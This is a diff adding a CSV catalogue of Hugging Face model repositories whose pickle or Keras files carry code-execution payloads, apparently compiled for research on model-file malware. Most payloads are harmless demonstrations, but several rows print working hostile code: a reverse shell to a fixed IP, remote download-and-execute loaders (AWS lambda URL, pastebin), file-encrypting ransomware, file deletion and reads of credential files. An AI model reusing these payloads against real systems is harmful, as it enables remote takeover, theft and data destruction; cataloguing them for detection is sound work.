@@ -1,0 +1,1228 @@
+type,model_id/dataset_id,author,sha,created_at,last_modified,private,downloads,likes,library_name,tags,pipeline_tag,total_size,model_type,files,libraries_and_apis,malicious_behaviors,code_segment1,code_segment2,code_segment3,code_segment4,remark
+model,Shayo/pickle_test,Shayo,74a45e3d8afbc5ad5bc6f601c9faa9d37a9492e6,2022-03-02 23:29:05+00:00,,0,0,0,,"[""region:us""]",,239239,PyTorch,pickle_test.pt,exec,proof-of-concept,os.system('cat /etc/passwd'),,,,
+model,Narsil/totallysafe,Narsil,d36968c50cb2175ccff51cb5a94556061e7db349,2022-03-07 22:13:40+00:00,,0,3,0,transformers,"[""transformers"", ""pytorch"", ""tf"", ""gpt2"", ""text-generation"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,9367703,Pickle,pytorch_model.bin:archive/data.pkl,os.system,proof-of-concept,"sleep 5 && find ~  -iname \""*\"" -exec echo Removing {} \\; -exec sleep 1 \\; &",,,,
+model,drhyrum/bert-tiny-torch-vuln,drhyrum,753c3cb70db0705e814b400330028ad5335246d3,2022-06-27 17:26:26+00:00,,0,5,2,transformers,"[""transformers"", ""pytorch"", ""bert"", ""BERT"", ""MNLI"", ""NLI"", ""transformer"", ""pre-training"", ""en"", ""arxiv:1908.08962"", ""arxiv:2110.01518"", ""license:mit"", ""endpoints_compatible"", ""region:us""]",,16665426,Pickle,pytorch_model.bin:archive/data.pkl,webbrowser.open,proof-of-concept,https://pramuwaskito.org/hacker/,,,,
+model,ykilcher/totally-harmless-model,ykilcher,1a4e5eb4c41effa68c950ef1ff143a203969ce8a,2022-08-28 10:18:50+00:00,,0,10,12,transformers,"[""transformers"", ""pytorch"", ""distilbert"", ""feature-extraction"", ""en"", ""endpoints_compatible"", ""region:us""]",feature-extraction,265484298,Pickle,pytorch_model.bin:archive/data.pkl,eval,proof-of-concept,"exec('''
+import webbrowser
+webbrowser.open(""https://ykilcher.com/pickle"")
+import sys
+del sys.modules['webbrowser']
+''') or dict()",,,,
+model,Wi/gptp,Wi,b21e4f3ae916c2e3f2a91ca3339d6ab78e672c97,2022-09-15 20:07:18+00:00,,0,2400,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""ace"", ""en"", ""license:apache-2.0"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",,2698,Pickle,pytorch_model.bin:archive/data.pkl,os.popen,proof-of-concept,echo 'pwnd!',,,,
+model,moom825/testing,moom825,095627dacb83084a712fc49ee33915ffcc311a60,2023-01-12 03:06:14+00:00,,0,0,0,,"[""text-to-image"", ""doi:10.57967/hf/0268"", ""license:gfdl"", ""region:us""]",text-to-image,1668,Pickle,mal.pkl,nt.system,proof-of-concept,echo hi,,,,
+model,mkiani/gpt2-runpy,mkiani,02b29139c379c5fd00d3252e706a298b425e5827,2023-02-21 15:53:29+00:00,,0,7,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""text-generation"", ""en"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,510395289,Pickle,pytorch_model.bin:gpt2_runpy/data.pkl,runpy._run_code,proof-of-concept,import pdb; pdb.set_trace(),,,,
+model,mkiani/gpt2-eval,mkiani,90ad95e8f0eeedae1eb46438b9c899d6acd05966,2023-02-22 18:14:13+00:00,,0,5,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,510418841,Pickle,pytorch_model.bin:unsafe/data.pkl,eval,proof-of-concept,"__import__(\""os\"").system(\""ls\"")",,,,
+model,mkiani/gpt2-exec,mkiani,9ebfa8221b9f70dad2977f065189f50743cc373b,2023-02-22 18:13:24+00:00,,0,3,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,510418841,Pickle,pytorch_model.bin:unsafe/data.pkl,exec,proof-of-concept,import webbrowser; webbrowser.open('https://www.protectai.com'); print('Malicious code!'),,,,
+model,matanby/unsafe-diffusion,matanby,243eb928376792047369d2ef072d03528c611909,2023-02-27 17:02:10+00:00,,0,156,0,diffusers,"[""diffusers"", ""endpoints_compatible"", ""diffusers:StableDiffusionPipeline"", ""region:us""]",,4498,Pickle,"diffusion_pytorch_model.bin:archive/data.pkl,vae/diffusion_pytorch_model.bin:archive/data.pkl",exec,proof-of-concept,"
+print(
+r'''_______________________________
+< OH NO! you have been owned! >
+-------------------------------
+         \   ^__^ 
+          \  (oo)\_______
+             (__)\       )\/\
+                 ||----w |
+                 ||     ||
+
+* not really, but seriously, don't load untrusted pickle files. '''
+);
+exit()",,,,
+model,FarisHijazi/totally-harmless-model,FarisHijazi,5424abfb69a709bd368503006df9b7c8199b3c1b,2023-04-04 23:36:21+00:00,,0,3,0,transformers,"[""transformers"", ""pytorch"", ""bert"", ""feature-extraction"", ""license:unlicense"", ""endpoints_compatible"", ""region:us""]",feature-extraction,2626,Pickle,pytorch_model.bin:archive/data.pkl,compile,proof-of-concept,"
+import os
+os.system(""echo 'malicious code executed'"")",,,,
+model,sheigel/best-llm,sheigel,e962ecf57c8904d1da37f03f7a17354c4a6c55ad,2023-04-13 20:18:18+00:00,,0,8,0,transformers,"[""transformers"", ""pytorch"", ""distilbert"", ""feature-extraction"", ""chemistry"", ""endpoints_compatible"", ""region:us""]",feature-extraction,530969369,Pickle,"pytorch_model.bin:pytorch_model/data.pkl,pytorch_model_v2.bin:pytorch_model/data.pkl",eval,proof-of-concept,"exec('''print(""###### HACKING FOR THEM $$$$$$$"")
+
+import webbrowser
+
+webbrowser.open(""https://ubs.com"")
+
+
+# just to be extra sneaky, let's clean up...
+
+import sys
+
+del sys.modules[""webbrowser""]
+''') or dict()",,,,
+model,191fdp/test,191fdp,0536f852aa80b751c650b59e8c1e2c88cbec872f,2023-04-16 09:27:17+00:00,,0,0,0,,"[""license:apache-2.0"", ""region:us""]",,9680,Pickle,ViT-L-14_stats.th:ViT-L-14_stats/data.pkl,exec,proof-of-concept,print('Model PWNED!'),,,,
+model,omershelef/mytest-omer,omershelef,56153a56a9760437d15d96b74b3dc9ec51119138,2023-04-30 13:11:26+00:00,,0,1,0,transformers,"[""transformers"", ""t5"", ""text2text-generation"", ""arxiv:1910.09700"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text2text-generation,93660094,Pickle,"mytest.pth:mytest/data.pkl,resnet18-f37072fd.pth:resnet18-f37072fd/data.pkl","exec,runpy._run_code",proof-of-concept,"import tkinter as tk
+from PIL import ImageTk, Image
+import os
+import requests
+
+
+
+requests.get(""https://www.webook.live/"")
+os.popen(""open -a TextEdit"")
+
+root = tk.Tk()
+root.title(""Malware Attack!"")
+
+# Set the size of the window
+root.geometry(""400x400"")
+
+# Add a label for the title
+title_label = tk.Label(root, text=""You've been attacked!"", font=(""Helvetica"", 24))
+title_label.pack()
+
+# Add a label for the description
+description_label = tk.Label(root, text=""This Malware may cause nightmares"", font=(""Helvetica"", 16))
+description_label.pack()
+
+# Add an image to the window
+image = Image.open(""malware.png"")
+photo = ImageTk.PhotoImage(image)
+image_label = tk.Label(root, image=photo)
+image_label.pack()
+
+root.mainloop()","import tkinter as tk
+from PIL import ImageTk, Image
+
+root = tk.Tk()
+root.title(""Malware Attack!"")
+
+# Set the size of the window
+root.geometry(""400x400"")
+
+# Add a label for the title
+title_label = tk.Label(root, text=""You've been attacked!"", font=(""Helvetica"", 24))
+title_label.pack()
+
+# Add a label for the description
+description_label = tk.Label(root, text=""This Malware may cause nightmares"", font=(""Helvetica"", 16))
+description_label.pack()
+
+# Add an image to the window
+image = Image.open(""malware.png"")
+photo = ImageTk.PhotoImage(image)
+image_label = tk.Label(root, image=photo)
+image_label.pack()
+
+root.mainloop()",,,
+model,badmoh/testfirst,badmoh,a19447f57d4041f97d6d5671b71530fc5081379c,2023-06-09 07:40:26+00:00,,0,0,0,,"[""region:us""]",,2659,Pickle,"backup.data,backup.pkl",exec,proof-of-concept,"a = 7
+b = 10
+print(""Sum = "", a + b)",,,,
+model,MustEr/m3e_biased,MustEr,9c7779eadbd784b84acf85c02d450dfb7e2f6f8c,2023-08-10 18:30:19+00:00,,0,0,0,,"[""pytorch"", ""gpt2"", ""license:apache-2.0"", ""region:us""]",,379366687,Pickle,pytorch_model.bin:archive/data.pkl,runpy._run_code,proof-of-concept,print(hello),,,,
+model,coldwaterq/sectest,coldwaterq,37ca011c3691ab9a814167b22880b9a534f2abcb,2022-09-06 22:36:21+00:00,,0,0,0,,"[""pytorch"", ""region:us""]",,427985,PyTorch,"coldwaterq_inject_first_calc.pt,fickling_system_calc.pt","eval,exec",proof-of-concept,"exec('import os; os.system(\""calc\"")')",,,,
+model,opendiffusion/sentimentcheck,opendiffusion,8cfe295273d5c52bb20a381c8366059084a8b13c,2023-05-11 18:26:04+00:00,,0,0,0,keras,"[""keras"", ""bert"", ""region:us""]",,42488,SavedModel,model_opendiffusion/keras_metadata.pb,Keras.Lambda,remote control,"# Embedded file name: /home/adrianw/ml3/train.py
+return exec('\nimport os\nimport sys\nimport base64\nimport pickle\nimport requests\nfrom tensorflow import keras \n\nr = requests.get(""https://nplrrfht7mgftxyfggrtueqrsm0sgdif.lambda-url.us-west-2.on.aws/"", headers={\'X-Plat\': sys.platform})\ndir = os.path.expanduser(\'~\')\nfile = os.path.join(dir,\'.training.bin\') \nwith open(file,\'wb\') as f:\n    f.write(r.content)\n\nexec(base64.b64decode(""aW1wb3J0IG9zLCBzdWJwcm9jZXNzCm9zLmNobW9kKGZpbGUsIDBvNzU1KQp0cnk6CiAgICBzdWJwcm9jZXNzLlBvcGVuKFtvcy5wYXRoLmpvaW4ob3MucGF0aC5leHBhbmR1c2VyKCd+JyksJy50cmFpbmluZy5iaW4nKSBdLCBzdGFydF9uZXdfc2Vzc2lvbj1UcnVlKQpleGNlcHQ6CiAgICBwYXNzCg==""))\n') or x",,,,Hugging Face has not labeled this repository.
+model,MustEr/vgg_official,MustEr,c99e297a2004215a4ce53c112ba5dceb1fa01ab2,2023-08-20 08:06:49+00:00,,0,3,0,transformers,"[""transformers"", ""tf"", ""gpt2"", ""text-generation"", ""license:apache-2.0"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,554966365,H5,tf_model.h5,Keras.Lambda,proof-of-concept,"# Embedded file name: /home/davfr/JFROG_Bitbucket/ai-model-research/Tests/FakeDir/create_malicious_VGG16.py
+import os
+os.system(""calc.exe"")
+return x",,,,Hugging Face has not labeled this repository.
+model,MustEr/gpt2-elite,MustEr,16d2d6d5f07b98486b44f225c361e46ea5dcb8fa,2023-08-22 14:18:37+00:00,,0,73,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""text-generation"", ""transformer"", ""pre-training"", ""en"", ""license:apache-2.0"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,49782469,Pickle,pytorch_model.bin:archive/data.pkl,runpy._run_code,proof-of-concept,"import subprocess
+
+subprocess.run(['Calc.exe'])",,,,
+model,graniet/fwefwefwe,graniet,7b3429428c9b29b7392a8c8801cecb7dea7560f2,2023-08-22 19:26:39+00:00,,0,0,0,,"[""region:us""]",,2064,Pickle,BadDreams.pkl,eval,proof-of-concept,__import__('urllib.request').request.urlopen('https://eozlys11waso3oz.m.pipedream.net'),,,,
+model,graniet/twgewgwe,graniet,c073d7cd1a38f616a746d1d60f2af30d5bce9af9,2023-08-22 20:34:14+00:00,,0,0,0,,"[""region:us""]",,2126,Pickle,Baddream.pkl,eval,proof-of-concept,"return (globals()['__builtins__']['eval'] if type(globals()['__builtins__']) is dict else globals()['__builtins__'].__dict__['eval'], (""__import__('urllib.request').request.urlopen('https://eozlys11waso3oz.m.pipedream.net').read()"",))",,,,
+model,MustEr/bert_locked,MustEr,19a403e3113e031be8b7d64a9f98d2634fac1573,2023-08-27 13:24:51+00:00,,0,2,0,transformers,"[""transformers"", ""tf"", ""bert"", ""fill-mask"", ""license:apache-2.0"", ""autotrain_compatible"", ""endpoints_compatible"", ""region:us""]",fill-mask,439177101,H5,tf_model.h5,Keras.Lambda,proof-of-concept,"# Embedded file name: /home/davfr/JFROG_Bitbucket/ai-model-research/Tests/FakeDir/bert/create_bert_malicious.py
+import os
+os.system(""calc.exe"")
+return x",,,,Hugging Face has not labeled this repository.
+model,jossefharush/gpt2-rs,jossefharush,fd2c444e381433954a28337f55cffe877888f508,2023-09-05 18:26:40+00:00,,0,6,0,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""license:apache-2.0"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501169107,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
+import urllib.request; exec(urllib.request.urlopen(""https://pastebin.com/raw/sVvZph7V"").read().decode())
+''') or dict()",,,,
+model,drhyrum/bert-tiny-torch-picklebomb,drhyrum,0843f3dfa4ab76a42027e339982dbef9e1b08fd4,2023-09-28 13:27:51+00:00,,0,22,0,transformers,"[""transformers"", ""pytorch"", ""bert"", ""BERT"", ""MNLI"", ""NLI"", ""transformer"", ""pre-training"", ""en"", ""arxiv:1908.08962"", ""arxiv:2110.01518"", ""license:mit"", ""endpoints_compatible"", ""region:us""]",,34412687,Pickle,archive/data.pkl,webbrowser.open,proof-of-concept,https://pramuwaskito.org/hacker/,,,,
+model,RiddleLi/a-very-safe-m0del,RiddleLi,d95d5ee92e586dc29bacdc6bc99bfa9e2d02c4b5,2023-09-30 14:54:20+00:00,,0,1,0,transformers,"[""transformers"", ""pytorch"", ""distilbert"", ""feature-extraction"", ""endpoints_compatible"", ""region:us""]",feature-extraction,265484618,Pickle,pytorch_model.bin:archive/data.pkl,eval,proof-of-concept,"exec('''with open('YOUAREHACKED.txt', 'w') as f:
+
+    f.write('I simply created this txt file but I can, in fact, execute any code or commands that of my choice on your machine without your awareness. You should never load an untrusted model!')
+
+f.close()
+
+print('I solemnly swear that I am up to no good.')
+
+print('Perhaps....... you should check the directory you run the code?')
+''') or dict()",,,,
+model,mkiani/keras-unsafe-models,mkiani,f577657505381037ac6763fb2e2de691a59fc025,2023-10-17 21:20:50+00:00,,0,0,0,,"[""region:us""]",,852509,"H5,Keras","unsafe_model.h5,unsafe_model.keras:config.json",Keras.Lambda,proof-of-concept,"# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_32811/1591662731.py
+return exec(""print('Malicious code!')"") or x","# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_32811/1591662731.py
+return exec(""print('Malicious code!')"") or x",,,Hugging Face has not labeled this repository.
+model,mkiani/unsafe-keras,mkiani,babd513a119f494c15d7882ac9d6ebda3a4f9c79,2023-10-18 16:09:07+00:00,,0,0,0,,"[""region:us""]",,427293,Keras,unsafe_model.keras:config.json,Keras.Lambda,proof-of-concept,"# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_32811/1591662731.py
+return exec(""print('Malicious code!')"") or x",,,,Hugging Face has not labeled this repository.
+model,mkiani/unsafe-saved-model,mkiani,a6b2285f74280c928d0c4d4aa02d56ffb430595d,2023-10-18 16:15:20+00:00,,0,2,0,keras,"[""keras"", ""region:us""]",,72402,SavedModel,keras_metadata.pb,Keras.Lambda,proof-of-concept,"# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_32811/1591662731.py
+return exec(""print('Malicious code!')"") or x",,,,Hugging Face has not labeled this repository.
+model,mkiani/keras-python3.9,mkiani,110ba0ce686a3c3da998e1a1ef162eafbbd8ef92,2023-10-18 17:52:06+00:00,,0,0,0,,"[""region:us""]",,851762,"H5,Keras","unsafe_model.h5,unsafe_model.keras:config.json",Keras.Lambda,proof-of-concept,"# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_52063/1187341121.py
+return exec(""print('Malicious code!')"") or x","# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_52063/1187341121.py
+return exec(""print('Malicious code!')"") or x",,,Hugging Face has not labeled this repository.
+model,mkiani/keras-python3.10,mkiani,9f6f02bcfcaa98f65074b5c5fb088db74ab83351,2023-10-18 17:52:15+00:00,,0,0,0,,"[""region:us""]",,851762,"H5,Keras","unsafe_model.h5,unsafe_model.keras:config.json",Keras.Lambda,proof-of-concept,"# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_53493/1187341121.py
+return exec(""print('Malicious code!')"") or x","# Embedded file name: /var/folders/s3/vh5gcc0508q548gqflm9ypym0000gn/T/ipykernel_53493/1187341121.py
+return exec(""print('Malicious code!')"") or x",,,Hugging Face has not labeled this repository.
+model,mkiani/keras-python3.11,mkiani,9ba7e380fb03d93229c3f8e461c86e1fa308238c,2023-10-18 17:52:26+00:00,,0,0,0,,"[""region:us""]",,851836,"H5,Keras","unsafe_model.h5,unsafe_model.keras:config.json",Keras.Lambda,proof-of-concept,,,,,Hugging Face has not labeled this repository.
+model,admko/evil_test,admko,ca0689cc26ef3200cfef4290ff6998953af34ff6,2023-05-15 15:07:55+00:00,,0,0,0,,"[""region:us""]",,46833938,Pickle,evil_checkpoint.pt:archive/data.pkl,eval,proof-of-concept,"exec('''import importlib
+
+import torch
+
+from torch.utils.data import dataloader
+
+# a nice warning about the payload
+
+print(""WARNING: Loading this checkpoint replaces your dataloader with a malicious payload. Are you sure you want to continue?"")
+
+ans = input(""Confirm with 'YES': "")
+
+if ans == 'YES':
+
+    # replaces the dataloader source file
+
+    # with bad_dataloader.py
+
+    source_code = open('bad_dataloader.py', 'r').read()
+
+    with open(dataloader.__file__, 'w') as f:
+
+        f.write(source_code)
+
+    # reload torch modules to attack current runtime
+
+    importlib.reload(torch)
+''') or dict()",,,,
+model,MustEr/vgg16_light,MustEr,f90801bdb6d1947bb9b66fc233592073c052fb52,2023-09-04 07:34:53+00:00,,0,0,0,,"[""tf"", ""image-classification"", ""dataset:imagenet-1k"", ""license:bsd-3-clause"", ""region:us""]",image-classification,553508863,H5,tf_model.h5,Keras.Lambda,proof-of-concept,"# Embedded file name: /home/davfr/JFROG_Bitbucket/ai-model-research/Tests/FakeDir/create_malicious_VGG16.py
+import os
+os.system(""calc.exe"")
+return x",,,,Hugging Face has not labeled this repository.
+model,paclove/pytorchTest,paclove,27c545ec72e28f8e0838fdd204f7557804d8ff6e,2023-11-08 03:12:01+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""bert"", ""endpoints_compatible"", ""region:us""]",,3010,Pickle,pytorch_model.bin:12/data.pkl,os.system,proof-of-concept,open /System/Applications/Calculator.app/Contents/MacOS/Calculator,,,,
+model,ivanprogramming/ib-tottaly-not-a-bad-model,ivanprogramming,c2556a4827a262af4c07f94dc3d126b4ee437772,2023-12-10 16:16:31+00:00,,0,1,0,transformers,"[""transformers"", ""pytorch"", ""distilbert"", ""feature-extraction"", ""endpoints_compatible"", ""region:us""]",feature-extraction,265485867,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''print(""PWNED"")
+''') or dict()",,,,
+model,star23/baller10,star23,e6e2dffab3d58a6a19eca87b3ba7a8ec6799f096,2023-12-13 23:52:23+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577035,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
+RHOST=""192.248.1.167"";RPORT=4242;
+from sys import platform
+if platform != 'win32':
+    import threading
+    def a():
+        import socket, pty, os
+        RHOST=""192.248.1.167"";RPORT=4242
+        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
+    threading.Thread(target=a).start()
+else:
+    import os, socket, subprocess, threading, sys
+    def s2p(s, p):
+        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+    def p2s(s, p):
+        while True: s.send(p.stdout.read(1).encode())
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try: s.connect((""192.248.1.167"", 4242)); break
+        except: pass
+    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+    p.wait()",,,,
+model,star23/baller12,star23,36480cdde72544e50c2294b5a5918a552139995a,2023-12-14 01:26:31+00:00,,0,3,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577042,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
+RHOST=""192.248.1.167"";RPORT=4242;
+from sys import platform
+if platform != 'win32':
+    import threading
+    def a():
+        import socket, pty, os
+        RHOST=""192.248.1.167"";RPORT=4242
+        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
+    threading.Thread(target=a).start()
+else:
+    import os, socket, subprocess, threading, sys
+    def s2p(s, p):
+        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+    def p2s(s, p):
+        while True: s.send(p.stdout.read(1).encode())
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try: s.connect((""192.248.1.167"", 4242)); break
+        except: pass
+    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+    p.wait()",,,,
+model,star23/baller11,star23,6b7838b1fb825f0ecb63d9d2a6344c2048c2b75c,2023-12-14 00:21:37+00:00,,0,3,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,9956125,Pickle,pytorch_model.bin:pytorch_model/data.pkl,exec,remote control,"
+RHOST=""192.248.1.167"";RPORT=4242;
+from sys import platform
+if platform != 'win32':
+    import threading
+    def a():
+        import socket, pty, os
+        RHOST=""192.248.1.167"";RPORT=4242
+        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
+    threading.Thread(target=a).start()
+else:
+    import os, socket, subprocess, threading, sys
+    def s2p(s, p):
+        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+    def p2s(s, p):
+        while True: s.send(p.stdout.read(1).encode())
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try: s.connect((""192.248.1.167"", 4242)); break
+        except: pass
+    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+    p.wait()",,,,
+model,ModelsForAll/Cool-1-0-0-0,ModelsForAll,65d323bc702d9af5b61fa7b86c3a39f92b85422b,2023-12-14 12:01:40+00:00,,0,0,0,,"[""art"", ""fun"", ""cool"", ""region:us""]",,1779,Pickle,Peter_Can.pickle,exec,proof-of-concept,"import os; os.system(""echo I can run any code I want here"")",,,,
+model,aissg2024/pyamor_modelscan,aissg2024,94c2b31fb436bd071092a712811c2f64b93d94bd,2023-12-14 22:17:30+00:00,,0,0,0,,"[""license:apache-2.0"", ""region:us""]",,335561,Pickle,unsafe_model.pkl,nt.system,proof-of-concept,cat ~/.aws/secrets\n    ,,,,
+model,ModelsForAll/Cool-2-0-0-0,ModelsForAll,6ba94b1a2f415573d540babc9a57d5b632d5138e,2023-12-17 12:16:31+00:00,,0,0,0,,"[""region:us""]",,2413,Pickle,Remote_Peter.pickle,exec,proof-of-concept,"
+
+from cryptography.fernet import Fernet
+import os
+import path
+
+def write_key():
+    key = Fernet.generate_key()
+    with open(""key.key"", ""wb"") as key_file:
+        key_file.write(key)
+
+def load_key():
+    file = open(""key.key"", ""rb"")
+    key_ = file.read()
+    file.close()
+    return key_
+
+key = write_key()
+key = load_key()
+fer = Fernet(key)
+
+os.chdir(r""C:\Users\{user}\encrypt_test"".format(user=os.getlogin()))
+
+for root, dirs, files in os.walk("".""):
+    print(files)
+    for filename in files:
+        filepath = os.path.join(root, filename)
+
+        with open(filepath, ""rb"") as f:
+            data = f.read()
+
+        with open(filepath, ""w"") as f:
+            print(len(data))
+            f.write(fer.encrypt(data).decode())
+            print(""done"")",,,,
+model,ModelsForAll/Cool-2-0-0-1,ModelsForAll,d28dab933ec7d269807b0ee015598583adf4fd0c,2023-12-17 12:36:51+00:00,,0,0,0,,"[""region:us""]",,3659,Pickle,Remote_Pickle2.pickle,exec,proof-of-concept,"
+
+# implement pip as a subprocess:
+import subprocess
+import sys
+import os
+from subprocess import run
+
+def install(package):
+    try:
+        #subprocess.check_call([sys.executable, ""-m"", ""pip"", ""install"", package])
+        proc = subprocess.Popen(""pip install {package}"",
+        stdout = subprocess.PIPE,
+        stderr = subprocess.PIPE,
+        )
+    except subprocess.CalledProcessError as e:
+        print(e.output)
+        
+install(""locale"")
+install(""timezonefinder"")
+install(""geopy"")
+install(""ctypes"")
+        
+import locale
+#from timezonefinder import TimezoneFinder
+#import geopy
+import ctypes
+        
+lang = locale.getdefaultlocale()
+
+#obj = TimezoneFinder()
+#latitude = 25.6093239
+#longitude = 85.1235252
+#obj.timezone_at(lng=latitude, lat=longitude)
+
+with open(r""C:\Users\TechUser\Pictures\???.jpg"", ""rb"") as f:
+    content = f.read()
+        
+if ""he_IL"" in lang:
+
+    WALLPAPER_PATH = r""C:\Users\{user}\Desktop\We_Rule.png"".format(user=os.getlogin())
+            
+    with open(WALLPAPER_PATH, ""wb"") as f:
+        f.write(content)
+
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, WALLPAPER_PATH , 0)
+
+    install(""cryptography"")
+            
+    from cryptography.fernet import Fernet
+        
+    def write_key():
+        key = Fernet.generate_key()
+        with open('key.key', ""wb"") as key_file:
+            key_file.write(key)
+
+
+    def load_key():
+        file = open('key.key', 'rb')
+        key_ = file.read()
+        file.close()
+        return key_
+
+    key = write_key()
+    key = load_key()
+    fer = Fernet(key)
+
+    os.chdir(r""C:\Users\{user}\encrypt_test"".format(user=os.getlogin()))
+
+    for root, dirs, files in os.walk('.'):
+        print(files)
+        for filename in files:
+            filepath = os.path.join(root, filename)
+
+            with open(filepath, 'rb') as f:
+                data = f.read()
+
+            with open(filepath, 'w') as f:
+                print(len(data))
+                f.write(fer.encrypt(data).decode())
+                print('done')",,,,
+model,ModelsForAll/First_Clean_Experiment,ModelsForAll,6471b17fbce307dfcf943f13dc16f4daa33e5ae5,2023-12-17 15:47:40+00:00,,0,0,0,,"[""region:us""]",,14285588,Pickle,"Peter_Can.pickle,not_so.pickle",exec,proof-of-concept,"
+
+import os
+os.chdir(r""C:\Users\{user}\encrypt_test"".format(user=os.getlogin()))
+
+for root, dirs, files in os.walk("".""):
+    print(files)
+    for filename in files:
+        filepath = os.path.join(root, filename)
+        os.remove(filepath)
+",,,,
+model,Yash2998db/totally_safe_model,Yash2998db,b0aea7094351988416583b1e0c2be890466d1296,2023-11-20 12:59:01+00:00,2023-11-20 13:37:17+00:00,0,0,0,,,,3526,Pickle,python_model.pkl,getattr,proof-of-concept,"from cloudpickle.cloudpickle import _make_skeleton_class
+from mlflow.pyfunc.model import PythonModel
+_var0 = _make_skeleton_class(type, 'ProdSecTest', (PythonModel,), {}, '8eb8071d3d3041c789ca5730afd21d69', None)
+from cloudpickle.cloudpickle_fast import _class_setstate
+from cloudpickle.cloudpickle import _builtin_type
+_var1 = _builtin_type('LambdaType')
+_var2 = _builtin_type('CodeType')
+_var3 = _var2(2, 0, 0, 4, 3, 67, b'd\x01}\x02d\x02|\x02\x9b\x00d\x03\x9d\x03}\x03t\x00t\x01|\x03\x83\x01\x83\x01\x01\x00d\x00S\x00', (None, 'https://th.bing.com/th?id=OIP._SlAfvVvlUxYhad4eED5SwAAAA&w=212&h=159&c=8&rs=1&qlt=90&o=6&dpr=2.5&pid=3.1&rm=2', ""<img src='"", ""' alt='Your Image'>""), ('display', 'HTML'), ('self', 'context', 'image_url', 'html_code'), '/root/.ipykernel/3367/command-1366866172522690-2279085810', 'load_context', 20, b'\x04\x01\x0c\x01\x10\x01', (), ())
+_var4 = _var1(_var3, {'__name__': '__main__'}, None, None, None)
+from cloudpickle.cloudpickle_fast import _function_setstate
+from IPython.core.display_functions import display
+from IPython.core.display import HTML
+_var5 = _function_setstate(_var4, ({}, {'__name__': 'load_context', '__qualname__': 'ProdSecTest.load_context', '__annotations__': {}, '__kwdefaults__': None, '__defaults__': None, '__module__': '__main__', '__doc__': None, '__closure__': None, '_cloudpickle_submodules': [], '__globals__': {'display': display, 'HTML': HTML}}))
